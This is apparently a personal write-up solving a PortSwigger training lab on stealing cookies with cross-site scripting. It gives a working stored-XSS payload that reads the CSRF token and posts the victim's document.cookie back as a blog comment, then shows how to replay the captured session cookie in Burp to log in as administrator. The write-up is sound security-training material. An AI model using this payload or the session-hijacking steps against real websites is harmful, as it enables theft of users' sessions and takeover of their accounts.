# Lab: Exploiting cross-site scripting to steal cookies
# https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

# I don't have professional version so I will try to solve it by alternative way.

```bash
# Create a comment with

<script>alert()</script>

# Alert works.
```
```bash

# Go to post with post id 9 and create comment

<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 9);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'a@gmail.com');
data.append('website', 'http://www.abc.abca');

fetch('/post/comment', {
 method: 'POST',
 mode: 'no-cors',
 body: data
});
});
</script>

```
```bash
# Go to burp take my-account get request to repeater from target.
# Copy the Victims session that commented out and add this into  our request and send it.

Cookie: session=PT8KB2sp0YW1rVKadZ1zMKSRE3ubtbbU;

# If you render the response you see that the username of the user is administrator.
# If you get back to page you will see that you solved the lab.
```

# Reference: https://www.youtube.com/watch?v=N_87S9XVy0w
